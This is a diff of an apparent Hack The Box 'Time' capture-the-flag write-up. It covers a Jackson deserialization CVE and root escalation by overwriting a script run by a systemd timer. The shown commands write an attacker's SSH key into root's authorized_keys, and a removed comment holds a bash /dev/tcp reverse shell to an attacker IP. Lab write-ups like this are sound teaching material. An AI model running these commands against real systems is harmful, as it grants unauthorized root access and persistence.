@@ -36,7 +36,6 @@ If we send a request to validate some JSON data such as `{"key":"value"}`, we re
 Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object
 {% endhighlight %}
 
-<!-- TODO: Core -->
 After some googling, it is possible to find [a couple of CVE:s](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=jackson) for the Jackson library. One of the CVE:s which can be identified is [CVE-2019-12384](https://nvd.nist.gov/vuln/detail/CVE-2019-12384). When searching for more information about this vulnerability, it is possible to find a [blog post](https://blog.doyensec.com/2019/07/22/jackson-gadgets.html) explaining how to exploit the vulnerability. In the blog post, the authors explain that the CVE enables the execution of arbitrary SQL statements when the Jackson library deserializes and then re-serialize the JSON object below.
 
 {% highlight JSON linenos %}
@@ -122,8 +121,6 @@ We can enumerate systemd timers by executing `systemctl list-timers --all`. Exec
 
 As can be seen in the `ACTIVATES` column, the first timer `timer_backup.timer` activates the service `timer_backup.service`. We can obtain more information about this service by executing `systemctl cat timer_backup.service` to show the contents of its configuration file. This results in the output below which informs us that the service simply restarts another service named "web_backup.service".
 
-<!-- ![find1](/assets/{{ imgDir }}/find1.png) -->
-
 {% highlight none linenos %}
 [Unit]
 Description=Calls website backup
@@ -155,9 +152,6 @@ echo 'mkdir -p /root/.ssh && echo "[id_rsa.pub]" >> /root/.ssh/authorized_keys' 
 {% endhighlight %}
 Then, we execute the command above to place the command `mkdir -p /root/.ssh && echo "[id_rsa.pub]" >> /root/.ss h/authorized_keys` in the `timer_backup.sh` file. This command creates a `.ssh` directory in the `root` user's home directory and adds our public key to a file named "authorized_keys" in this directory. Note that `[id_rsa.pub]` should be the content of the `id_rsa.pub` file we generated earlier, as demonstrated below.
 
-<!-- We proceed to execute `echo 'bash -i >& /dev/tcp/10.10.14.4/443 0>&1' > /usr/bin/timer_backup.sh` to overwrite `timer_backup.sh` with our reverse shell payload. -->
-
-<!-- ![overwrite](/assets/{{ imgDir }}/overwrite.png) -->
 {% highlight none linenos %}
 pericles@time:/var/www/html$ echo 'mkdir -p /root/.ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDFoWVw8wEzbTLovM683V9WMByt5lNHDItm6p8rbqemXtJMUEzjzBG+uSTeTfh2xgRVWx+1DWkWZjiwi7I11gagSUAwbf92cwwlbVgF4C18vI0OzjeMhBlO6zEyF06etLcsI+DsSuHmCEL56rvEDIOkFauLYIuKB5JTR8/Uhqb/KlMrKPN6QLni8NOqpraGJYQ7OLhJKTGDcNIqBgVDWDPudqDZDSPhn5sy7TD28CX/x+Y/jRpHqAAhR52T1PKVUDbusLEfA1XBROlONhT+sYj0GVocfb8QYFDQR80exAAz/I9X5Bfo6Z9ncYnZCp3Cq/bgZZRdhjgYxwUfZEZBI/1WLZRyVbjfVkDAjyPgBtmaoLURvYVgFW0vuzbKRNLfMZGBGdVEp0dF+cfx9DkpYZzX/kRx1S5RtWjWwmP/Xq7JmEKRZhQDJHdSquFxqCdZ+aBPCS26xvSAnT/9XJRhjRtEExLAMWIKiS6K+t8kvX+eZEJ2qUX6LPqNy95QZzJghk8= kali@kali" >> /root/.ssh/authorized_keys' > /usr/bin/timer_backup.sh
 <ot/.ssh/authorized_keys' > /usr/bin/timer_backup.sh
@@ -170,20 +164,3 @@ pericles@time:/var/www/html$
 ![rootSSH](/assets/{{ imgDir }}/rootSSH.png)
 
 After waiting for 10 seconds, we know that the command has executed and has configured SSH for the `root` user. At this point, we can get a `root` shell by simply executing `ssh -i id_rsa root@10.10.10.214` to log in over SSH with our private key!
-
-<!-- ![root](/assets/{{ imgDir }}/root.png) -->
-
-<!-- Next, we start a netcat listener by executing `nc -lvnp 443` locally. After a couple of seconds, the target connects to the listener and we obtain a shell as the `root` user. -->
-
-<!-- ![systemctlCat](/assets/{{ imgDir }}/systemctlCat.png) -->
-
-<!-- We don't know where these files are located. We can search the whole file system for them (quick and dirty way).
-![findSH](/assets/{{ imgDir }}/findSH.png)
-find / -name web_backup.service 2>/dev/null
-
-timer_backup.service
-
-![find2](/assets/{{ imgDir }}/find2.png)
--->
-
-
